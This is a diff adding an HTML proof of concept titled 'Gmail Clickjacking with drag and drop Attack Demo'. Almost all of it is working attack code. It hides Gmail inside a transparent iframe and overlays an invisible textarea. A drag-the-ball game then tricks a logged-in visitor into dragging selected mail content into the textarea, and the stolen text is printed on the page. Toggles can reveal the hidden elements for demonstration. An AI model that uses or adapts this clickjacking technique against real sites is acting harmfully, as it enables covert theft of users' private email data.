@@ -1,0 +1,116 @@
+<html>
+
+  <head>
+    <title>
+      Gmail Clickjacking with drag and drop Attack Demo
+    </title>
+    <style>
+      .iframe_hidden{height: 50px; width: 50px; top:360px; left:365px; overflow:hidden;
+        filter: alpha(opacity=0); opacity:.0; position: absolute; } .text_area_hidden{
+          height: 30px; width: 30px; top:160px; left:670px; overflow:hidden; filter:
+            alpha(opacity=0); opacity:.0; position: absolute; } .ball{ top:350px; left:350px;
+              position: absolute; } .ball_1{ top:136px; left:640px; filter: alpha(opacity=0);
+                opacity:.0; position: absolute; }.Dolphin{ top:150px; left:600px; position:
+                  absolute; }.center{ margin-right: auto;margin-left: auto; vertical-align:middle;text-align:center;
+                    margin-top:350px;}
+    </style>
+    <script>
+      function Init() {
+        var source = document.getElementById("source");
+        var target = document.getElementById("target");
+        if (source.addEventListener) {
+          target.addEventListener("drop", DumpInfo, false);
+        } else {
+          target.attachEvent("ondrop", DumpInfo);
+        }
+      }
+      function DumpInfo(event) {
+        showHide_ball.call(this);
+        showHide_ball_1.call(this);
+        var info = document.getElementById("info");
+        info.innerHTML += "<span style='color:#3355cc;font-size:13px'>" + event.dataTransfer.getData('Text') + "</span><br> ";
+      }
+      function showHide_frame() {
+        var iframe_1 = document.getElementById("iframe_1");
+        iframe_1.style.opacity = this.checked ? "0.5": "0";
+        iframe_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity=" + (this.checked ? "50": "0") + ");"
+      }
+      function showHide_text() {
+        var text_1 = document.getElementById("target");
+        text_1.style.opacity = this.checked ? "0.5": "0";
+        text_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity=" + (this.checked ? "50": "0") + ");"
+      }
+      function showHide_ball() {
+        var hide_ball = document.getElementById("hide_ball");
+        hide_ball.style.opacity = "0";
+        hide_ball.style.filter = "alpha(opacity=0)";
+      }
+      function showHide_ball_1() {
+        var hide_ball_1 = document.getElementById("hide_ball_1");
+        hide_ball_1.style.opacity = "1";
+        hide_ball_1.style.filter = "alpha(opacity=100)";
+      }
+      function reload_text() {
+        document.getElementById("target").value = '';
+      }
+    </script>
+  </head>
+
+  <body onload="Init();">
+    <center>
+      <h1>
+        Gmail Clickjacking with drag and drop Attack
+      </h1>
+    </center>
+    <img id="hide_ball" src=ball.png class="ball">
+    <div id="source">
+      <iframe id="iframe_1" src="https://mail.google.com/mail/ig/mailmax" class="iframe_hidden"
+              scrolling="no">
+      </iframe>
+    </div>
+    <img src=Dolphin.jpg class="Dolphin">
+    <div>
+      <img id="hide_ball_1" src=ball.png class="ball_1">
+    </div>
+    <div>
+      <textarea id="target" class="text_area_hidden">
+      </textarea>
+    </div>
+    <div id="info" style="position:absolute;background-color:#e0e0e0;font-weight:bold; top:600px;">
+    </div>
+    <center>
+      Note: Clicking "ctrl + a" to select the ball, then drag it to the
+      <br>
+      mouth of the dolphin with the mouse.Make sure you have logged into GMAIL.
+      <br>
+    </center>
+    <br>
+    <br>
+    <div class="center">
+      <center>
+        <center>
+          <input id="showHide_frame" type="checkbox" onclick="showHide_frame.call(this);"
+                 />
+          <label for="showHide_frame">
+            Show the jacked I--Frame
+          </label>
+          |
+          <input id="showHide_text" type="checkbox" onclick="showHide_text.call(this);"
+                 />
+          <label for="showHide_text">
+            Show the jacked Textarea
+          </label>
+          |
+          <input type=button value="Replay" onclick="location.reload();reload_text();">
+        </center>
+        <br><br>
+        <b>
+          Design by
+          <a target="_blank" href="http://hi.baidu.com/xisigr">
+            xisigr
+          </a>
+        </b>
+      </center>
+    </div>
+  </body>
+</html>
